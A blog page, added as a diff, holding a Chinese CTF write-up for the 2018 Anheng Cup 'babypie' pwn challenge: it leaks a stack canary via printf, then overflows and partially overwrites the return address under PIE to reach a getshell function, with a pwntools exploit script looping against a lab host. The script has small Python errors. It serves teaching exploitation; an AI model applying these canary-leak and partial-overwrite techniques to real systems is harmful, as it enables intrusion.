@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>2018 安恒杯 pwn babypie | closefrom</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://closefrom.github.io/favicon.ico?v=1615649066608">
+<link rel="stylesheet" href="https://closefrom.github.io/styles/main.css">
+
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="前置知识：{
+1.
+PIE:
+position-independent executables, 位置无关的可执行文件，也就是常说的
+ASLR(Address space layout randomization) 地址随机化，程序每次启动..." />
+    <meta name="keywords" content="pwn" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://closefrom.github.io">
+        <img src="https://closefrom.github.io/images/avatar.png?v=1615649066608" class="site-logo">
+        <h1 class="site-title">closefrom</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="https://closefrom.github.io/archives" class="site-nav">
+            文章汇总
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            文章标签分类
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      The deeper you explore, the more you close from the truth
+    </div>
+    <div class="site-footer">
+      <div>
+	<a href="https://www.zyglz.com"> © 资源管理站</a>
+	<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+	<p><span id="busuanzi_container_site_uv" style='display:none'>总访客人数量<span id="busuanzi_value_site_uv"></span>次</span></p>
+	<p><span id="busuanzi_container_site_pv" style='display:none'>本站总访问量<span id="busuanzi_value_site_pv"></span>次</span></p>
+</div>
+Powered by <a href="https://github.com/getgridea/gridea" target="_blank">closefrom</a> | <a class="rss" href="https://closefrom.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">2018 安恒杯 pwn babypie</h2>
+            <div class="post-date">2021-03-13</div>
+            
+            <div class="post-content" v-pre>
+              <p>前置知识：{<br>
+1.<br>
+PIE:<br>
+position-independent executables, 位置无关的可执行文件，也就是常说的<br>
+ASLR(Address space layout randomization) 地址随机化，程序每次启动基址都随机。<br>
+一般情况下NX（Windows平台上称其为DEP）和地址空间分布随机化（ASLR）会同时工作。<br>
+分三种情况：<br>
+(1) 0 - 表示关闭进程地址空间随机化。<br>
+(2) 1 - 表示将mmap的基址，stack和vdso页面随机化。<br>
+(3) 2 - 表示在1的基础上增加栈（heap）的随机化。</p>
+<p>2.canary保护机制开启后，x86_64下从fs:0x28偏移处获取canary，并且放在%ebp-0x8位置,程序返回之前再取出，与fs:0x28处的值作异或运算，结果为0则为修改，正常返回，不为0则执行__stack_chk_fail函数处理异常</p>
+<p>3.printf 使用 %s 时, 遇到 \0 结束, 覆盖 canary 低位为非 0 值时, canary 就可以被 printf 打印出来了</p>
+<p>}<br>
+文件链接：https://pan.baidu.com/s/17pIc0RrfLRH9arMbJmJGjA<br>
+提取码：4olb<br>
+搭建环境：<br>
+<img src="https://closefrom.github.io/post-images/1615577654335.png" alt="" loading="lazy"></p>
+<p>1.查看文件的保护机制<br>
+<img src="https://closefrom.github.io/post-images/1615577677082.png" alt="" loading="lazy"></p>
+<p>2.ubuntu运行ida的远程调试文件，idax64打开文件<br>
+<img src="https://closefrom.github.io/post-images/1615577693843.png" alt="" loading="lazy"><br>
+<img src="https://closefrom.github.io/post-images/1615577705306.png" alt="" loading="lazy"><br>
+打开后发现函数窗口有getshell函数。然后进入main函数<br>
+<img src="https://closefrom.github.io/post-images/1615577718731.png" alt="" loading="lazy"><br>
+跟进到sub_960函数<br>
+<img src="https://closefrom.github.io/post-images/1615577735247.png" alt="" loading="lazy"><br>
+可以发现有两个read函数中间夹着一个printf函数，第一个read可以覆盖到%ebp上面的canary（这里把canary最高字节的\x00覆盖掉，不然printf函数无法泄露canary值），printf函数输出canary值。第二个read函数栈溢出，可以覆盖eip，由于上面泄露了canary值，可以绕过canary值检测。多次加载程序发现，无论多少次程序加载，代码段的最后12位，是不变的。(通常来说，一个内存页大小为0x1000，这就意味着不管地址怎么变，某条指令的后12位，3个十六进制数的地址是始终不变的)<br>
+<img src="https://closefrom.github.io/post-images/1615577749958.png" alt="" loading="lazy"><br>
+可以看到，getshell函数的地址，跟返回地址只有最后的12位是不同的，但是read按照的是字节写入，可以尝试写入\x3E\x3A，直到程序不崩溃，则成功getshell<br>
+<img src="https://closefrom.github.io/post-images/1615577769329.png" alt="" loading="lazy"><br>
+看一下有漏洞的函数的伪代码<br>
+注：printf函数的%s是从栈中的高字节向低字节取</p>
+<p>3.编写exp</p>
+<pre><code>
+from pwn import *
+
+context.binary = './babypie'
+while true:
+    try:
+        link = remote("192.168.93.137","6666")
+        payload1 = 'A'*(0x30-0x8+1)
+        link.sendafter(":\n",payload1)
+        canary ='\0' + link.recv(7)
+        #recv(N) 接受 N(数字) 字符；
+        canary.encode('hex')
+        #'\x11\x22\x33\x44'.encode('hex') 是shellcode转16进制
+        #'abc123451'.decode('hex')是16进制转shellcode
+        payload2 = 'A'*(0x30-0x8) + canary + 'BBBBBBBB' +  '\x3E\x3A'
+        link.sendafter(":\n",payload2)
+        link.interactive()
+        #也可以： canary = u64('\x00'+link.recv(7))
+        #然后 payload2 = 'A'*(0x30-0x8) + p64(canary) + 'BBBBBBBB' +  '\x3E\x3A'
+        #再 link.sendafter(":\n",payload2)
+        #payload2中的8个B是覆盖ebp
+        #u64即将shellcode变成整数，p64则反之 (ps：必须要是8字节)
+   except exception as ka:
+       link.close()
+       print ka
+</code></pre>
+<p>运行脚本，getshell，查看flag<br>
+<img src="https://closefrom.github.io/post-images/1615577814826.png" alt="" loading="lazy"></p>
+
+            </div>
+            
+              <div class="tag-container">
+                
+                  <a href="https://closefrom.github.io/tag/mQz58myZ-/" class="tag">
+                    pwn
+                  </a>
+                
+              </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://closefrom.github.io/post/defcamp-ctf-finals-2016-pwn-sms/">
+                  <h3 class="post-title">
+                    DefCamp CTF Finals 2016 pwn SMS
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+
+
+
+
+  </body>
+</html>
